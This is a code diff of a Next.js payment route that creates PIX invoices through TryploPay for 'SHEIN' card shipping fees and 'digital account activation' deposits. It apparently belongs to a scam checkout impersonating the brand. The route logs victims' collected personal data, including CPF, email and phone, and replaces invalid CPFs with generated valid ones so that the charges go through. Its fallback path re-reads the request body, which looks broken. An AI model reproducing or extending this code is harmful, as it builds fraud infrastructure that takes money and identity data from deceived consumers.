@@ -61,12 +61,12 @@ function getClientIP(request: NextRequest): string {
 
 export async function POST(request: NextRequest) {
   try {
-    console.log("=== CRIANDO FATURA PIX ===")
+    console.log("🚀 === CRIANDO FATURA PIX TRYPLOPAY ===")
 
     const body = await request.json()
     const { amount, shipping, method } = body
 
-    console.log("Dados recebidos:", { amount, shipping, method })
+    console.log("📋 Dados recebidos:", { amount, shipping, method })
 
     // Validar dados obrigatórios
     if (!amount) {
@@ -84,11 +84,15 @@ export async function POST(request: NextRequest) {
     const authData = await authResponse.json()
 
     if (!authData.success) {
-      throw new Error("Falha na autenticação")
+      throw new Error("Falha na autenticação TryploPay")
     }
 
     const { access_token, account } = authData.data
     const isSimulation = authData.fallback || authData.data.working === "SIMULATION"
+
+    console.log("🔑 Token obtido:", access_token ? "✅ Válido" : "❌ Inválido")
+    console.log("🏢 Conta:", account?.name || "Simulação")
+    console.log("🎭 Modo:", isSimulation ? "SIMULAÇÃO" : "PRODUÇÃO")
 
     // Carregar dados reais do usuário coletados durante o fluxo
     const getUserData = () => {
@@ -145,20 +149,18 @@ export async function POST(request: NextRequest) {
 
     const userData = getUserData()
 
-    console.log("📋 Dados do lead carregados:")
+    console.log("👤 Dados do cliente:")
     console.log("Nome:", userData.nome)
     console.log("CPF:", userData.cpf)
     console.log("Email:", userData.email)
     console.log("Telefone:", userData.telefone)
-    console.log("Endereço:", userData.endereco)
 
     // Validar e corrigir CPF se necessário
     let document = userData.cpf?.replace(/[^\d]/g, "") || ""
     if (!validateCPF(document)) {
       console.log("⚠️ CPF inválido, gerando CPF válido para teste")
-      console.log("CPF original:", userData.cpf)
       document = generateValidCPF()
-      console.log("CPF gerado:", document)
+      console.log("✅ CPF gerado:", document)
     } else {
       console.log("✅ CPF válido:", document)
     }
@@ -171,10 +173,14 @@ export async function POST(request: NextRequest) {
       ? "Depósito de Ativação - Conta Digital SHEIN"
       : `Frete ${method || shipping?.toUpperCase() || "SEDEX"} - Cartão SHEIN`
 
-    // Atualizar o external_id para diferenciá-lo:
+    // Gerar external_id único para rastreamento
     const externalId = isActivation
       ? `SHEIN_ACT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
       : `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+
+    console.log("🆔 External ID gerado:", externalId)
+    console.log("💰 Valor total:", `R$ ${totalAmount.toFixed(2)}`)
+    console.log("📦 Produto:", productTitle)
 
     // Preparar payload oficial da TryploPay
     const invoicePayload = {
@@ -221,11 +227,18 @@ export async function POST(request: NextRequest) {
       },
     }
 
+    console.log("📤 Dados da fatura preparados:", {
+      external_id: externalId,
+      amount: totalAmount.toFixed(2),
+      client_name: userData.nome,
+      client_document: document,
+    })
+
     let invoiceData
 
     if (!isSimulation) {
       // Tentar criar fatura real
-      console.log("🔄 Criando fatura real na TryploPay...")
+      console.log("🌐 Enviando para TryploPay...")
 
       const apiUrl = process.env.TRYPLOPAY_API_URL || "https://api.tryplopay.com"
 
@@ -238,13 +251,26 @@ export async function POST(request: NextRequest) {
         body: JSON.stringify(invoicePayload),
       })
 
+      console.log("📥 Resposta da criação:", {
+        status: response.status,
+        statusText: response.statusText,
+        ok: response.ok,
+      })
+
       if (response.ok) {
         const data = await response.json()
         console.log("✅ Fatura real criada com sucesso")
+        console.log("🔍 Dados da fatura:", {
+          id: data.fatura?.id,
+          invoice_id: data.fatura?.invoice_id,
+          has_pix: !!data.fatura?.pix,
+          pix_payload: data.fatura?.pix?.payload ? "✅ Presente" : "❌ Ausente",
+        })
 
         invoiceData = {
           id: data.fatura.id,
           invoice_id: data.fatura.invoice_id,
+          external_id: externalId,
           pix: {
             payload: data.fatura.pix.payload,
             image: data.fatura.pix.image,
@@ -256,52 +282,23 @@ export async function POST(request: NextRequest) {
           secure: data.fatura.secure,
           type: "real",
         }
+
+        console.log("🎉 Fatura TryploPay criada com sucesso!")
+        return NextResponse.json({
+          success: true,
+          data: invoiceData,
+          fallback: false,
+        })
       } else {
-        throw new Error(`Erro na API: ${response.status}`)
+        const errorText = await response.text()
+        console.log("❌ Erro na criação da fatura:", errorText)
+        throw new Error(`Erro ${response.status}: ${errorText}`)
       }
     } else {
       throw new Error("Modo simulação ativado")
     }
-
-    const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.example.com/qr/v2/SIMULATED${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`
-
-    const simulatedInvoice = {
-      id: `SIM_${Date.now()}`,
-      invoice_id: `SIMULATED_${Date.now()}`,
-      external_id: externalId, // Adicionar external_id
-      pix: {
-        payload: simulatedPixCode,
-        image: `/placeholder.svg?height=250&width=250`,
-        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPixCode)}`,
-      },
-      status: {
-        code: 1,
-        title: "Aguardando Pagamento",
-        text: "pending",
-      },
-      valores: {
-        bruto: Math.round(totalAmount * 100), // em centavos
-        liquido: Math.round(totalAmount * 100),
-      },
-      vencimento: {
-        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
-      },
-      secure: {
-        id: `simulated-${Date.now()}`,
-        url: `${request.nextUrl.origin}/checkout`,
-      },
-      type: "simulated",
-    }
-
-    console.log(`✅ Fatura simulada criada - Valor: R$ ${totalAmount.toFixed(2)}`)
-
-    return NextResponse.json({
-      success: true,
-      data: invoiceData,
-      fallback: true,
-    })
   } catch (error) {
-    console.log("❌ Erro ao criar fatura, usando fallback:", error)
+    console.log("❌ Erro ao criar fatura TryploPay, usando fallback:", error)
 
     // Extrair dados da requisição para fallback
     const body = await request.json()
@@ -317,7 +314,7 @@ export async function POST(request: NextRequest) {
     const simulatedInvoice = {
       id: `SIM_${Date.now()}`,
       invoice_id: `SIMULATED_${Date.now()}`,
-      external_id: externalId, // GARANTIR que está sempre presente
+      external_id: externalId,
       pix: {
         payload: simulatedPixCode,
         image: `/placeholder.svg?height=250&width=250`,
